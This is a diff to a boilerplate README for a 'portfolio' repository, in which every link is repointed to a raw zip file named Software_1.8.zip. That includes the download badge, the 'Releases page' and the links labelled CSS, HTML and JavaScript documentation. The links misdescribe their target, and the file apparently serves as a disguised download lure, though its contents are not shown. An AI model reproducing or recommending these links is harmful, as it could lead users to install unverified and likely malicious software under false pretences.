@@ -1,6 +1,6 @@
 # 🚀 portfolio - Build Your Multi-Platform Applications Easily
 
-![Download Portfolio](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/portfolio.zip)
+![Download Portfolio](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/Software_1.8.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To start exploring my portfolio, follow the steps below. You don’t need progra
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/portfolio.zip) to find the available files.
+1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/Software_1.8.zip) to find the available files.
    
 2. **Select the version:** You will see a list of releases. Choose the latest version for the best experience.
 
@@ -90,12 +90,12 @@ These topics provide the foundation for building responsive and interactive webs
 
 Learn more about the technologies used in this portfolio:
 
-- [CSS Documentation](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/portfolio.zip)
-- [HTML Documentation](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/portfolio.zip)
-- [JavaScript Documentation](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/portfolio.zip)
+- [CSS Documentation](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/Software_1.8.zip)
+- [HTML Documentation](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/Software_1.8.zip)
+- [JavaScript Documentation](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/Software_1.8.zip)
 
 ## 🎉 Conclusion
 
 Thank you for visiting the **portfolio** repository. This collection is designed to help you explore web development. Download the applications, try them out, and gain insights into the world of multi-platform application development.
 
-For more information, don’t hesitate to check the [Releases page](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/portfolio.zip) again to stay updated. Happy exploring!
+For more information, don’t hesitate to check the [Releases page](https://raw.githubusercontent.com/Kofi-Doe/portfolio/master/predestinationist/Software_1.8.zip) again to stay updated. Happy exploring!
